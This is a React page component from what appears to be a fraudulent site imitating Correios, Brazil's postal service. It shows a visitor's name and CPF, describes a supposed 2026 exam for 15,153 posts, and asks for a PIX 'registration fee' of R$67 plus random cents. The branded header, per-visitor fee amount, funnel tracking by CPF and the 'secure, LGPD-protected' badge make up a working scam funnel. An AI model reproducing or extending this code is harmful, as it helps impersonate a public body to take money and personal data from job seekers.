import { useEffect, useState } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { BookOpen, Target, GraduationCap, FileText, Shield, CheckCircle } from "lucide-react";
import CorreiosHeader from "@/components/CorreiosHeader";
import CorreiosFooter from "@/components/CorreiosFooter";
import CorreiosCard from "@/components/CorreiosCard";
import { CPFData } from "@/lib/cpf";
import { saveSession, getSession } from "@/hooks/useSessionPersistence";
import { buildUrlWithUtm } from "@/hooks/useUtmTracking";
import { trackFunnelEvent } from "@/hooks/useFunnelTracking";

const DetalhesInscricao = () => {
  const navigate = useNavigate();
  const location = useLocation();

  const cpfData: CPFData | undefined = location.state?.cpfData || getSession()?.cpfData;
  const cepData = location.state?.cepData;

  const [centavos] = useState(() => Math.floor(Math.random() * 99) + 1);
  const valorInscricao = 67 + centavos / 100;

  useEffect(() => {
    if (!cpfData) { navigate("/"); return; }
    saveSession({ cpfData, currentStep: "/detalhes-inscricao" });
    trackFunnelEvent("detalhes-inscricao", { cpf: cpfData.cpf });
    window.scrollTo(0, 0);
  }, [cpfData, navigate]);

  const handlePagar = () => {
    navigate(buildUrlWithUtm("/pagamento"), {
      state: { cpfData, cepData, valorBeneficio: valorInscricao, protocolo: `COR-${Date.now()}` },
    });
  };

  if (!cpfData) return null;

  const estudos = [
    { icon: BookOpen, title: "Português e Matemática", desc: "Disciplinas básicas obrigatórias em todos os cargos" },
    { icon: FileText, title: "Provas anteriores dos Correios", desc: "Entenda o estilo do IBFC e o tipo de cobrança" },
    { icon: Target, title: "Raciocínio Lógico e Atendimento", desc: "Raciocínio Lógico, Atendimento ao Cliente e Legislação Postal" },
    { icon: GraduationCap, title: "Simulados regulares", desc: "Afira seu desempenho e ajuste o plano de estudo" },
  ];

  return (
    <div className="min-h-screen flex flex-col bg-background">
      <CorreiosHeader breadcrumb="Concursos > Agente de Correios > Inscrição > Detalhes" />

      <main className="flex-1 px-4 py-6 sm:py-8 space-y-5 max-w-lg mx-auto w-full">
        {/* Candidato */}
        <CorreiosCard>
          <div className="flex items-center gap-3">
            <CheckCircle className="w-5 h-5 text-primary shrink-0" />
            <div>
              <p className="text-xs text-muted-foreground">Candidato confirmado</p>
              <p className="font-bold text-foreground text-sm">{cpfData.nome}</p>
              <p className="text-xs text-muted-foreground">CPF: {cpfData.cpf}</p>
            </div>
          </div>
        </CorreiosCard>

        {/* Sobre o concurso */}
        <CorreiosCard>
          <h1 className="text-lg font-bold text-foreground mb-3">Concurso Correios 2026</h1>
          <div className="space-y-2 text-sm text-muted-foreground">
            <p><span className="font-semibold text-foreground">Cargo:</span> Atendente Comercial — Nível Médio</p>
            <p><span className="font-semibold text-foreground">Remuneração:</span> R$ 2.400 a R$ 3.000</p>
            <p><span className="font-semibold text-foreground">Vagas:</span> 15.153 em todo o Brasil</p>
            <p><span className="font-semibold text-foreground">Banca:</span> IBFC — Instituto Brasileiro de Formação e Capacitação</p>
          </div>
        </CorreiosCard>

        {/* O que estudar */}
        <CorreiosCard>
          <h2 className="text-base font-bold text-foreground mb-3">O que priorizar nos estudos?</h2>
          <p className="text-xs text-muted-foreground mb-4">
            Para garantir uma vaga, o segredo está em uma preparação direcionada e com método:
          </p>
          <div className="space-y-3">
            {estudos.map((item, i) => (
              <div key={i} className="flex gap-3 items-start">
                <div className="p-2 rounded-lg bg-primary/10 shrink-0">
                  <item.icon className="w-4 h-4 text-primary" />
                </div>
                <div>
                  <p className="font-semibold text-foreground text-sm">{item.title}</p>
                  <p className="text-xs text-muted-foreground">{item.desc}</p>
                </div>
              </div>
            ))}
          </div>
        </CorreiosCard>

        {/* Taxa */}
        <div className="rounded-lg border-2 border-accent bg-accent/10 p-5 text-center space-y-2">
          <p className="text-sm font-semibold text-foreground">Taxa de Inscrição</p>
          <p className="text-3xl font-black text-primary">
            R$ {valorInscricao.toFixed(2).replace(".", ",")}
          </p>
          <p className="text-xs text-muted-foreground">Pagamento via PIX — confirmação imediata</p>
        </div>

        <Button onClick={handlePagar} className="w-full h-12 text-sm font-bold">
          PAGAR TAXA DE INSCRIÇÃO
        </Button>

        <div className="flex items-center justify-center gap-2 text-muted-foreground">
          <Shield className="w-3.5 h-3.5" />
          <span className="text-[10px]">Pagamento seguro — Dados protegidos pela LGPD</span>
        </div>
      </main>

      <CorreiosFooter />
    </div>
  );
};

export default DetalhesInscricao;
